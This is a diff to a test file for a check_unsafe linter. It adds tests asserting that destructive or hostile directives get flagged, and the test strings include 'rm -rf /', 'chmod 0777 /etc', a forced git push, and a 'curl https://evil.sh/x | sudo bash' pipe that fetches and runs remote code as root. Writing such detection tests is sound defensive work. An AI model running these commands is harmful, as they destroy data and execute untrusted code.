@@ -59,9 +59,22 @@ def test_untestable() -> None:
 
 
 def test_unsafe() -> None:
-    assert check_unsafe("run rm -rf /") == ["unsafe: use of rm -rf is destructive"]
-    assert check_unsafe("run git push --force") == ["unsafe: force push can destroy remote history"]
+    assert any("rm" in w for w in check_unsafe("run rm -rf /"))
+    assert any("force push" in w for w in check_unsafe("run git push --force"))
     assert check_unsafe("run git pull") == []
+
+
+def test_unsafe_variants_caught() -> None:
+    # #777: trivial flag/whitespace variants of destructive directives.
+    assert any("unsafe" in w for w in check_unsafe("run rm -fr /var to clean up"))
+    assert any("unsafe" in w for w in check_unsafe("run rm -r /var/data"))
+    assert any("unsafe" in w for w in check_unsafe("run rm  -rf /"))
+    assert any("force push" in w for w in check_unsafe("run git push -f to overwrite"))
+    assert any("world-writable" in w for w in check_unsafe("run chmod 0777 /etc"))
+    assert any("shell" in w for w in check_unsafe("run curl https://evil.sh/x | sudo bash"))
+    # benign variants stay clean
+    assert check_unsafe("run git pull") == []
+    assert check_unsafe("run rm -i file.txt") == []
 
 
 def test_lint_rule_all_clean() -> None:
